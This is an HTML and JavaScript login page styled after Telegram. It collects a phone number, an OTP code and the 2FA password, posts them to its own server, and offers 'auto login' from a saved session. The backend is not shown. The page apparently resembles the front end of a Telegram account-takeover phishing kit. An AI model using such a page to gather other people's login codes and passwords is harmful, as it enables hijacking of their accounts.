<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Telegram OTP Login 2FA + Auto Session</title>
<style>
body {
  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
  background: linear-gradient(135deg, #6fc1fc, #ffffff);
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  margin: 0;
}
.login-container {
  background-color: #fff;
  border-radius: 20px;
  width: 380px;
  max-width: 90%;
  padding: 40px 30px;
  box-shadow: 0 12px 30px rgba(0,0,0,0.2);
  text-align: center;
}
.logo {
  width: 80px;
  height: 80px;
  margin: 0 auto 20px;
  background-color: #0088cc;
  border-radius: 50%;
  display: flex;
  justify-content: center;
  align-items: center;
  color: white;
  font-size: 36px;
  font-weight: bold;
}
h2 { margin: 0 0 20px; font-weight: 600; color: #333; }
input {
  width: 100%;
  padding: 14px 12px;
  margin: 12px 0;
  border-radius: 10px;
  border: 1px solid #ccc;
  font-size: 16px;
}
button {
  width: 100%;
  padding: 14px 12px;
  margin: 12px 0;
  border-radius: 10px;
  font-size: 16px;
  font-weight: 600;
  background-color: #0088cc;
  color: white;
  border: none;
  cursor: pointer;
}
button:hover { background-color: #006fa1; }
#message { margin-top: 10px; font-size: 14px; color: #333; }
</style>
</head>
<body>

<div class="login-container">
  <div class="logo">T</div>
  <h2>Telegram OTP Login 2FA</h2>

  <!-- Step 1: Phone input -->
  <div id="step-phone">
    <input type="text" id="phone" placeholder="Phone number" required>
    <button id="btn-next">Send OTP</button>
  </div>

  <!-- Step 2: OTP + 2FA input -->
  <div id="step-otp" style="display:none;">
    <input type="text" id="otp" placeholder="OTP code" required>
    <input type="password" id="password" placeholder="2FA password (if any)">
    <button id="btn-login">Login</button>
  </div>

  <!-- Auto login -->
  <div id="step-session">
    <button id="btn-auto">Auto login using saved session</button>
  </div>

  <p id="message"></p>
</div>

<script>
// Elements
const stepPhone = document.getElementById('step-phone');
const stepOtp = document.getElementById('step-otp');
const stepSession = document.getElementById('step-session');
const message = document.getElementById('message');
const btnNext = document.getElementById('btn-next');
const btnLogin = document.getElementById('btn-login');
const btnAuto = document.getElementById('btn-auto');

// Step 1: Send OTP
btnNext.addEventListener('click', async () => {
  const phone = document.getElementById('phone').value.trim();
  if (!phone) { message.textContent = 'Please enter phone number'; return; }

  try {
    message.textContent = 'Sending OTP...';
    const res = await fetch('/send-otp', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({phone})
    });
    const data = await res.json();
    if (data.success) {
      stepPhone.style.display = 'none';
      stepOtp.style.display = 'block';
      message.textContent = 'OTP sent! Check your phone.';
    } else {
      message.textContent = data.error || 'Failed to send OTP';
    }
  } catch(err){
    message.textContent = 'Error connecting to server';
  }
});

// Step 2: Login
btnLogin.addEventListener('click', async () => {
  const phone = document.getElementById('phone').value.trim();
  const otp = document.getElementById('otp').value.trim();
  const password = document.getElementById('password').value.trim();

  if (!otp) { message.textContent = 'Please enter OTP'; return; }

  try {
    message.textContent = 'Verifying OTP...';
    const res = await fetch('/login', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      body: JSON.stringify({phone, otp, password})
    });
    const data = await res.json();

    if(data.requirePassword){
      message.textContent = data.message;
      return;
    }

    if(data.success){
      message.textContent = data.message;
      // clear fields
      document.getElementById('otp').value = '';
      document.getElementById('password').value = '';
    } else {
      message.textContent = data.message;
    }

  } catch(err){
    message.textContent = 'Error connecting to server';
  }
});

// Step 3: Auto login using saved session
btnAuto.addEventListener('click', async () => {
  const phone = document.getElementById('phone').value.trim();
  if(!phone){ message.textContent='Enter phone to auto login'; return; }

  try{
    message.textContent = 'Attempting auto login...';
    const res = await fetch('/auto-login', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({phone})
    });
    const data = await res.json();
    if(data.success){
      message.textContent = 'Auto login success! Session active.';
      document.getElementById('otp').value='';
      document.getElementById('password').value='';
    } else {
      message.textContent = data.message || 'No saved session found';
    }
  } catch(err){
    message.textContent='Error connecting to server';
  }
});
</script>

</body>
</html>
